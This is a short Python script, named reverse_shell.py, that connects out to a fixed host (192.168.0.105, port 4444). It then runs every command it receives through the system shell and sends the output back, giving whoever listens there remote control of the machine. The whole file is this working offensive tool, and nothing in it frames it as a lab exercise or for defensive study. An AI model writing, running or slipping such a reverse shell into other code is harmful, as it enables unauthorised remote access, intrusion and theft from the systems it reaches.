# reverse_shell.py
import socket
import subprocess

def main():
    ip_address = '192.168.0.105'
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.sendall(output.encode('utf-8'))
    s.close()

if __name__ == "__main__":
    main()
